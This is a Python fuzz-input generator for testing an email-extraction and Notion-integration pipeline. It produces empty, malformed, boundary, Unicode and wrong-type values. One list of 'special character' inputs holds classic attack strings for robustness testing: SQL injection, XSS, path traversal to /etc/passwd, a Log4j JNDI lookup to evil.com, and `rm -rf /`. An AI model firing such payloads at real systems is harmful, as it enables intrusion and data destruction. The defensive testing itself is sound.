"""Fuzz input generation for testing edge cases and robustness.

This module provides utilities for generating fuzzy test inputs to validate
system robustness against:
- Invalid data types and formats
- Boundary conditions and extreme values
- Malformed input structures
- Unicode and special character handling
- Empty, null, and missing data scenarios

Usage:
    from collabiq.test_utils.fuzz_generator import (
        FuzzGenerator,
        generate_fuzz_emails,
        generate_fuzz_extraction_results,
    )

    # Generate fuzz test emails
    for email in generate_fuzz_emails(count=10):
        test_processor(email)

    # Generate fuzz extraction results
    for result in generate_fuzz_extraction_results(count=10):
        test_notion_integrator(result)
"""

import random
from typing import Any, Dict, List, Optional, Iterator
from dataclasses import dataclass
from enum import Enum


class FuzzCategory(str, Enum):
    """Categories of fuzz test inputs."""

    EMPTY = "empty"  # Empty strings, null values
    MALFORMED = "malformed"  # Invalid formats, broken structures
    BOUNDARY = "boundary"  # Edge cases, extreme values
    UNICODE = "unicode"  # Special characters, Unicode edge cases
    OVERSIZED = "oversized"  # Very long strings, large data
    SPECIAL_CHARS = "special_chars"  # Injection attempts, escape sequences
    TYPE_MISMATCH = "type_mismatch"  # Wrong data types
    MISSING_FIELDS = "missing_fields"  # Required fields absent


@dataclass
class FuzzConfig:
    """Configuration for fuzz input generation.

    Attributes:
        categories: List of FuzzCategory to generate
        seed: Random seed for reproducibility
        max_string_length: Maximum length for generated strings
        include_valid: Whether to include some valid inputs
        valid_ratio: Ratio of valid inputs (0.0-1.0)
    """

    categories: List[FuzzCategory] = None
    seed: Optional[int] = None
    max_string_length: int = 10000
    include_valid: bool = True
    valid_ratio: float = 0.1

    def __post_init__(self):
        if self.categories is None:
            self.categories = list(FuzzCategory)


class FuzzGenerator:
    """Generator for fuzz test inputs."""

    def __init__(self, config: Optional[FuzzConfig] = None):
        """Initialize fuzz generator.

        Args:
            config: Fuzz generation configuration
        """
        self.config = config or FuzzConfig()

        if self.config.seed is not None:
            random.seed(self.config.seed)

    def _should_generate_valid(self) -> bool:
        """Determine if this iteration should generate valid input."""
        return self.config.include_valid and random.random() < self.config.valid_ratio

    def generate_string(self, category: FuzzCategory) -> str:
        """Generate a fuzzed string based on category.

        Args:
            category: Type of fuzz input to generate

        Returns:
            Generated fuzz string
        """
        if category == FuzzCategory.EMPTY:
            return random.choice(["", " ", "\n", "\t", "   "])

        elif category == FuzzCategory.MALFORMED:
            return random.choice(
                [
                    "{incomplete json",
                    "```not closed",
                    "<tag>no close",
                    "\\invalid\\escape",
                    "\x00null byte",
                    "\r\n\r\nheaders",
                ]
            )

        elif category == FuzzCategory.BOUNDARY:
            return random.choice(
                [
                    "a",  # Minimum length
                    "A" * self.config.max_string_length,  # Maximum length
                    "-1",  # Negative number
                    "0",  # Zero
                    "999999999999",  # Large number
                ]
            )

        elif category == FuzzCategory.UNICODE:
            return random.choice(
                [
                    "안녕하세요 👋 こんにちは",  # Mixed scripts
                    "🔥💯🎉" * 10,  # Emoji spam
                    "\u202e" + "reversed",  # Right-to-left override
                    "test\u0000null",  # Embedded null
                    "ﷺ" * 100,  # Complex Unicode
                    "𝕳𝖊𝖑𝖑𝖔",  # Mathematical alphanumeric symbols
                ]
            )

        elif category == FuzzCategory.OVERSIZED:
            length = random.choice([1000, 5000, 10000, 50000])
            return "X" * length

        elif category == FuzzCategory.SPECIAL_CHARS:
            return random.choice(
                [
                    "'; DROP TABLE users; --",  # SQL injection
                    "<script>alert('xss')</script>",  # XSS
                    "../../../etc/passwd",  # Path traversal
                    "${jndi:ldap://evil.com}",  # Log4j
                    "\\x00\\x01\\x02",  # Binary data
                    "{{7*7}}",  # Template injection
                    "`rm -rf /`",  # Command injection
                ]
            )

        elif category == FuzzCategory.TYPE_MISMATCH:
            return str(
                random.choice(
                    [
                        123,  # Number as string
                        True,  # Boolean as string
                        None,  # None as string
                        [],  # List as string
                        {},  # Dict as string
                    ]
                )
            )

        elif category == FuzzCategory.MISSING_FIELDS:
            return ""  # Represents missing field

        return "default_fuzz"

    def generate_email_text(self, category: Optional[FuzzCategory] = None) -> str:
        """Generate fuzzed email text.

        Args:
            category: Specific category, or None for random

        Returns:
            Fuzzed email text
        """
        if self._should_generate_valid():
            return """
            안녕하세요,

            스타트업 "테스트컴퍼니"의 홍길동입니다.
            신세계그룹과의 파트너십 관련하여 2025년 12월 1일 회의를 요청드립니다.

            감사합니다.
            """

        if category is None:
            category = random.choice(list(FuzzCategory))

        return self.generate_string(category)

    def generate_extraction_result(
        self, category: Optional[FuzzCategory] = None
    ) -> Dict[str, Any]:
        """Generate fuzzed extraction result.

        Args:
            category: Specific category, or None for random

        Returns:
            Fuzzed extraction result dictionary
        """
        if self._should_generate_valid():
            return {
                "startup_name": {"value": "ValidCo", "confidence": 0.9},
                "person_in_charge": {"value": "John Doe", "confidence": 0.9},
                "partner_org": {"value": "Shinsegae", "confidence": 0.8},
                "details": {"value": "Partnership meeting", "confidence": 0.85},
                "date": {"value": "2025-12-01", "confidence": 0.95},
            }

        if category is None:
            category = random.choice(list(FuzzCategory))

        if category == FuzzCategory.MISSING_FIELDS:
            # Randomly omit fields
            fields = [
                "startup_name",
                "person_in_charge",
                "partner_org",
                "details",
                "date",
            ]
            present_fields = random.sample(fields, k=random.randint(0, len(fields)))
            return {
                field: {"value": "test", "confidence": 0.5} for field in present_fields
            }

        elif category == FuzzCategory.TYPE_MISMATCH:
            return {
                "startup_name": "not a dict",  # Wrong structure
                "person_in_charge": 123,  # Wrong type
                "partner_org": None,  # Null
                "details": [],  # Wrong type
                "date": {"wrong": "structure"},  # Missing value/confidence
            }

        elif category == FuzzCategory.EMPTY:
            return {
                "startup_name": {"value": None, "confidence": 0.0},
                "person_in_charge": {"value": "", "confidence": 0.0},
                "partner_org": {"value": None, "confidence": 0.0},
                "details": {"value": "", "confidence": 0.0},
                "date": {"value": None, "confidence": 0.0},
            }

        else:
            # Use fuzzed strings in values
            fuzz_value = self.generate_string(category)
            return {
                "startup_name": {"value": fuzz_value, "confidence": 0.5},
                "person_in_charge": {"value": fuzz_value, "confidence": 0.5},
                "partner_org": {"value": fuzz_value, "confidence": 0.5},
                "details": {"value": fuzz_value, "confidence": 0.5},
                "date": {"value": fuzz_value, "confidence": 0.5},
            }

    def generate_date_string(self, category: Optional[FuzzCategory] = None) -> str:
        """Generate fuzzed date string.

        Args:
            category: Specific category, or None for random

        Returns:
            Fuzzed date string
        """
        if self._should_generate_valid():
            valid_formats = [
                "2025-12-01",
                "2025년 12월 1일",
                "12월 1일",
                "다음 주 월요일",
            ]
            return random.choice(valid_formats)

        if category is None:
            category = random.choice(list(FuzzCategory))

        if category == FuzzCategory.MALFORMED:
            return random.choice(
                [
                    "2025-13-45",  # Invalid month/day
                    "2025/12/01",  # Wrong separator
                    "Dec 1st, 2025",  # English format
                    "1일 12월 2025년",  # Wrong order
                    "2025-12-",  # Incomplete
                ]
            )

        elif category == FuzzCategory.BOUNDARY:
            return random.choice(
                [
                    "0000-01-01",  # Minimum date
                    "9999-12-31",  # Maximum date
                    "2025-02-30",  # Invalid day for month
                    "2025-00-01",  # Zero month
                ]
            )

        else:
            return self.generate_string(category)


def generate_fuzz_emails(
    count: int = 10,
    config: Optional[FuzzConfig] = None,
    categories: Optional[List[FuzzCategory]] = None,
) -> Iterator[str]:
    """Generate fuzzed email texts for testing.

    Args:
        count: Number of fuzz inputs to generate
        config: Fuzz configuration
        categories: Specific categories to cycle through

    Yields:
        Fuzzed email text strings
    """
    generator = FuzzGenerator(config)
    categories_to_use = categories or list(FuzzCategory)

    for i in range(count):
        category = categories_to_use[i % len(categories_to_use)]
        yield generator.generate_email_text(category)


def generate_fuzz_extraction_results(
    count: int = 10,
    config: Optional[FuzzConfig] = None,
    categories: Optional[List[FuzzCategory]] = None,
) -> Iterator[Dict[str, Any]]:
    """Generate fuzzed extraction results for testing.

    Args:
        count: Number of fuzz inputs to generate
        config: Fuzz configuration
        categories: Specific categories to cycle through

    Yields:
        Fuzzed extraction result dictionaries
    """
    generator = FuzzGenerator(config)
    categories_to_use = categories or list(FuzzCategory)

    for i in range(count):
        category = categories_to_use[i % len(categories_to_use)]
        yield generator.generate_extraction_result(category)


def generate_fuzz_date_strings(
    count: int = 10,
    config: Optional[FuzzConfig] = None,
    categories: Optional[List[FuzzCategory]] = None,
) -> Iterator[str]:
    """Generate fuzzed date strings for testing.

    Args:
        count: Number of fuzz inputs to generate
        config: Fuzz configuration
        categories: Specific categories to cycle through

    Yields:
        Fuzzed date strings
    """
    generator = FuzzGenerator(config)
    categories_to_use = categories or list(FuzzCategory)

    for i in range(count):
        category = categories_to_use[i % len(categories_to_use)]
        yield generator.generate_date_string(category)


# CLI interface for standalone usage
if __name__ == "__main__":
    import sys
    import json

    # Simple CLI: generate and print fuzz inputs
    if len(sys.argv) < 2:
        print("Usage: python -m collabiq.test_utils.fuzz_generator <type> [count]")
        print("Types: email, extraction, date")
        sys.exit(1)

    input_type = sys.argv[1]
    count = int(sys.argv[2]) if len(sys.argv) > 2 else 10

    if input_type == "email":
        for i, email in enumerate(generate_fuzz_emails(count), 1):
            print(f"=== Email {i} ===")
            print(email)
            print()

    elif input_type == "extraction":
        for i, result in enumerate(generate_fuzz_extraction_results(count), 1):
            print(f"=== Extraction Result {i} ===")
            print(json.dumps(result, indent=2, ensure_ascii=False))
            print()

    elif input_type == "date":
        for i, date_str in enumerate(generate_fuzz_date_strings(count), 1):
            print(f"{i}. {date_str}")

    else:
        print(f"Unknown type: {input_type}")
        sys.exit(1)
